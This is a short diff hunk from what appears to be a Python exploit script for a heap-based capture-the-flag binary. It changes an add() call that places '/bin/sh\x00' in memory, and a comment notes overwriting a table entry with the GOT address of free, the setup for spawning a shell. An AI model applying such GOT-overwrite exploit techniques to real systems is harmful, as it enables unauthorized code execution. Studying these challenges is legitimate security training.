@@ -93,7 +93,7 @@ if __name__ == "__main__":
     # *g_player_tbl[a1] = GOT of free
     #
 
-    add(24, '/bin/sh', 8, '/bin/sh\x00')
+    add(24, 'AAAA', 8, '/bin/sh\x00')
     add(24, 'CCCC', 4, 'DDDD')
     add(24, 'EEEE', 4, 'FFFF')
     raw_input('after adding 3 items...')
